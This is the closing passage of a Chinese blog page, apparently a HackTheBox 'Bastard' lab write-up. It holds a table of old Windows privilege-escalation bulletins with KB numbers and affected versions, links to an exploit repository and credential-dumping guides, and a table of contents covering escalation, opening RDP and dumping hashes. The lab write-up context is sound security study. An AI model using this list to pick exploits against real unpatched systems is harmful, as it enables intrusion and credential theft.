class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-051</span> 　[KB3057191]　　[Windows Kernel Mode Drivers]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-010</span> 　[KB3036220]　　[Kernel Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS15<span class="number">-015</span> 　[KB3031432]　　[Kernel Driver]　　(Win7/<span class="number">8</span>/<span class="number">8.1</span>/<span class="number">2012</span>/RT/<span class="number">2012</span> R2/<span class="number">2008</span> R2)</span><br><span class="line">MS15<span class="number">-001</span> 　[KB3023266]　　[Kernel Driver]　　(<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-070</span> 　[KB2989935]　　[Kernel Driver]　　(<span class="number">2003</span>)</span><br><span class="line">MS14<span class="number">-068</span> 　[KB3011780]　　[Domain Privilege Escalation]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-058</span> 　[KB3000061]　　[Win32k.sys]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-040</span> 　[KB2975684]　　[AFD Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-002</span> 　[KB2914368]　　[NDProxy]　　(<span class="number">2003</span>/XP)</span><br><span class="line">MS13<span class="number">-053</span> 　[KB2850851]　　[win32k.sys]　　(XP/Vista/<span class="number">2003</span>/<span class="number">2008</span>/win <span class="number">7</span>)</span><br><span class="line">MS13<span class="number">-046</span> 　[KB2840221]　　[dxgkrnl.sys]　　(Vista/<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>)</span><br><span class="line">MS13<span class="number">-005</span> 　[KB2778930]　　[Kernel Mode Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/win7/<span class="number">8</span>)</span><br><span class="line">MS12<span class="number">-042</span> 　[KB2972621]　　[Service Bus]　　(<span class="number">2008</span>/<span class="number">2012</span>/win7)</span><br><span class="line">MS12<span class="number">-020</span> 　[KB2671387]　　[RDP]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP)</span><br><span class="line">MS11<span class="number">-080</span> 　[KB2592799]　　[AFD.sys]　　(<span class="number">2003</span>/XP)</span><br><span class="line">MS11<span class="number">-062</span> 　[KB2566454]　　[NDISTAPI]　　(<span class="number">2003</span>/XP)</span><br><span class="line">MS11<span class="number">-046</span> 　[KB2503665]　　[AFD.sys]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP)</span><br><span class="line">MS11<span class="number">-011</span> 　[KB2393802]　　[kernel Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP/Vista)</span><br><span class="line">MS10<span class="number">-092</span> 　[KB2305420]　　[Task Scheduler]　　(<span class="number">2008</span>/<span class="number">7</span>)</span><br><span class="line">MS10<span class="number">-065</span> 　[KB2267960]　　[FastCGI]　　(IIS <span class="number">5.1</span>, <span class="number">6.0</span>, <span class="number">7.0</span>, <span class="keyword">and</span> <span class="number">7.5</span>)</span><br><span class="line">MS10<span class="number">-059</span> 　[KB982799]　　 [ACL-Churraskito]　　(<span class="number">2008</span>/<span class="number">7</span>/Vista)</span><br><span class="line">MS10<span class="number">-048</span> 　[KB2160329]　　[win32k.sys]　　(XP SP2 &amp; SP3/<span class="number">2003</span> SP2/Vista SP1 &amp; SP2/<span class="number">2008</span> Gold &amp; SP2 &amp; R2/Win7)</span><br><span class="line">MS10<span class="number">-015</span> 　[KB977165]　　 [KiTrap0D]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP)</span><br><span class="line">MS09<span class="number">-050</span> 　[KB975517]　　 [Remote Code Execution]　　(<span class="number">2008</span>/Vista)</span><br><span class="line">MS09<span class="number">-020</span> 　[KB970483]　　 [IIS <span class="number">6.0</span>]　　(IIS <span class="number">5.1</span> <span class="keyword">and</span> <span class="number">6.0</span>)</span><br><span class="line">MS09<span class="number">-012</span> 　[KB959454]　　 [Chimichurri]　　(Vista/win7/<span class="number">2008</span>/Vista)</span><br><span class="line">MS08<span class="number">-068</span> 　[KB957097]　　 [Remote Code Execution]　　(<span class="number">2000</span>/XP)</span><br><span class="line">MS08<span class="number">-067</span> 　[KB958644]　　 [Remote Code Execution]　　(Windows <span class="number">2000</span>/XP/Server <span class="number">2003</span>/Vista/Server <span class="number">2008</span>)</span><br><span class="line">MS08<span class="number">-025</span> 　[KB941693]　　 [Win32.sys]　　(XP/<span class="number">2003</span>/<span class="number">2008</span>/Vista)</span><br><span class="line">MS06<span class="number">-040</span> 　[KB921883]　　 [Remote Code Execution]　　(<span class="number">2003</span>/xp/<span class="number">2000</span>)</span><br><span class="line">MS05<span class="number">-039</span> 　[KB899588]　　 [PnP Service]　　(Win <span class="number">9</span>X/ME/NT/<span class="number">2000</span>/XP/<span class="number">2003</span>)</span><br><span class="line">MS03<span class="number">-026</span> 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/<span class="number">2000</span>/XP/<span class="number">2003</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><ul>
+<li><a href="https://www.cnblogs.com/dgjnszf/p/11246612.html" target="_blank" rel="noopener">分享一个转储 lsass.exe 进程的工具 - CE653A - 博客园</a></li>
+<li><a href="https://0xdf.gitlab.io/2019/03/12/htb-bastard.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2019/03/12/htb-bastard.html</a></li>
+<li><a href="https://prakash-khadka.com.np/hackthebox-bastard-windows/" target="_blank" rel="noopener">https://prakash-khadka.com.np/hackthebox-bastard-windows/</a></li>
+<li><a href="https://github.com/Re4son/Chimichurri" target="_blank" rel="noopener">https://github.com/Re4son/Chimichurri</a></li>
+<li><a href="https://www.isfirst.net/drupal/drupal-reset-password" target="_blank" rel="noopener">https://www.isfirst.net/drupal/drupal-reset-password</a></li>
+<li><a href="https://www.freebuf.com/column/228496.html" target="_blank" rel="noopener">windows hash 抓取总结 - FreeBuf 专栏·TideSec</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/10/yuque/MKCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E7%BB%93%E3%80%90CVE%E3%80%91/" rel="next" title="MKCMS代码审计小结【CVE】">
+                <i class="fa fa-chevron-left"></i> MKCMS代码审计小结【CVE】
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/04/18/yuque/HackTheBox%EF%BC%9ACronos%E7%AC%94%E8%AE%B0/" rel="prev" title="HackTheBox：Cronos笔记">
+                HackTheBox：Cronos笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Unc1e</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NMAP"><span class="nav-number">1.1.</span> <span class="nav-text">NMAP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#提权"><span class="nav-number">2.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#提权：MS15-051"><span class="nav-number">2.1.</span> <span class="nav-text">提权：MS15-051</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权：MS10-059"><span class="nav-number">2.2.</span> <span class="nav-text">提权：MS10-059</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权：MS14-058"><span class="nav-number">2.3.</span> <span class="nav-text">提权：MS14-058</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#之后的玩法"><span class="nav-number">3.</span> <span class="nav-text">之后的玩法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#开-3389-进远程桌面"><span class="nav-number">3.1.</span> <span class="nav-text">开 3389 进远程桌面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#抓-hash"><span class="nav-number">3.2.</span> <span class="nav-text">抓 hash</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结与反思"><span class="nav-number">4.</span> <span class="nav-text">总结与反思</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#reference"><span class="nav-number">5.</span> <span class="nav-text">reference</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Unc1e</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
